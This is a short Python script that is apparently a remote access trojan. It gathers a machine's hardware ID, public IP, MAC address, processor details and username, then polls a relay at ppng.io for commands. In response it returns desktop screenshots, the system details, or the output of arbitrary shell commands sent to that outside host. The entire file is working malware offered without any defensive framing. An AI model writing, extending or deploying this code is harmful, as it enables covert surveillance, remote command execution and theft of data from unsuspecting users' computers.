from platform import architecture, processor
from pyautogui import screenshot
from os import getcwd, chdir
from uuid import getnode
import subprocess
import requests
import psutil
import os

link = "creep"

computer_information = {
    "Hwid": str(subprocess.check_output("wmic csproduct get uuid"), "utf-8").split("\n")[1].strip(),
    "Ip Address": requests.get("https://api.ipify.org").text,
    "Mac Address": ':'.join(['{:02x}'.format((getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
    "Cpu Threads": psutil.cpu_count(),
    "Architecture": architecture(),
    "Processor": processor(),
    "Operating System": "Windows" if os.name == "nt" else "Linux/MacOS",
    "Name": subprocess.check_output("whoami").decode().removesuffix("\r\n"),
}


def send(data):
    requests.post(
        f"https://ppng.io/{link}",
        data=str.encode(data) if type(data) is not bytes else data,
    )


def receive():
    return requests.get(f"https://ppng.io/{link}").text


while True:
    data = receive()

    if data == "<send_desktop>":
        s = screenshot()
        s.save(getcwd() + "/desktop.png")
        with open("desktop.png", "rb") as f:
            send(f.read())

    elif data == "<computer_information>":
        send(
            "\n".join(
                [
                    f"{information} : {computer_information[information]}"
                    for information in computer_information
                ]
            )
        )
    else:
        if data.startswith("cd") is not True:
            try:
                send(
                    subprocess.check_output(
                        data.split(" "), stderr=subprocess.STDOUT, shell=True
                    )
                )
            except Exception as err:
                send(f"Error : {str(err)}")

        elif data == "exit":
            send("Exiting...")
            break

        else:
            try:
                chdir(data.removeprefix("cd "))
                send(f"changed directories to -> {data.removeprefix('cd ')}")
            except Exception as err:
                send(f"Directory changing error : {str(err)}")
